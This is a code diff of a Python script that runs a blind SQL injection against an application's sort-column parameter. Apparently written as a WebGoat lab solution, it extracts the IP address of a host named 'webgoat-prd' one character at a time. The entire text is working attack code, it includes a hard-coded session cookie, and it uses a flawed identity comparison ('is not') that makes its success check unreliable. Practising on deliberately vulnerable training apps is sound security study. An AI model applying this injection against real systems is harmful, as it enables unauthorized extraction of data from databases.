@@ -7,15 +7,15 @@ header = {
 }
 
 cookies = {
-    'JSESSIONID': '4C322D560CDACCD0285413BF07A536C9'
+    'JSESSIONID': '9643C4B44CA08F82EBD0753F4E40D5DE'
 }
-
-for p in range(10):
-    print(p)
-
-for i in range(3):
+rememberID = ''
+for i in range(1, 16):
     for x in range(10):
-        sql_q = "(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substring(ip,1,%s) = '%s')IS NOT NULL THEN hostname ELSE id END)" % (i, x)
+        if i % 4 == 0:
+            rememberID += '.'
+            break
+        sql_q = "(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substring(ip,1,%s) = '%s')IS NOT NULL THEN hostname ELSE id END)" % (i, rememberID + str(x))
         params = {
             'column': sql_q,
         }
@@ -25,8 +25,8 @@ for i in range(3):
             print('Der Server hasst mich')
         else:
             json_data = json.loads(response.text)
-            if json_data[0].id == '3':
-                print(x)
+            if json_data[0]['id'] is not '1':
+                rememberID += str(x)
+                print(rememberID)
                 break
-            else:
-                print('Not quite right: %s' % x)
+            #print('Not quite right: %s' % x)
